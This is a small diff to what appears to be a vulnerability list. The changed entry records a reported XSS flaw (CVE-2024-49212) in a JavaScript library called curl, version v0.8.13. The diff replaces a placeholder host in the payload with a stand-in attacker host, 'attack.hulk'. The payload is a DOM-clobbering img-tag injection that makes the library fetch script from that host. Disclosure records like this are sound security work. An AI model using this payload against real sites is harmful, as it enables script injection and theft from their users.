@@ -5,7 +5,7 @@
 + Library: curl
 + Stars: 1.8K
 + Version: v0.8.13
-+ Payload: ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx">```
++ Payload: ```<img name="scripts" data-curl-run="http://attack.hulk/"><img name="scripts" data-curl-run="http://attack.hulk">```
 + Impact: XSS
 + CVE: CVE-2024-49212
 + Status: Reported
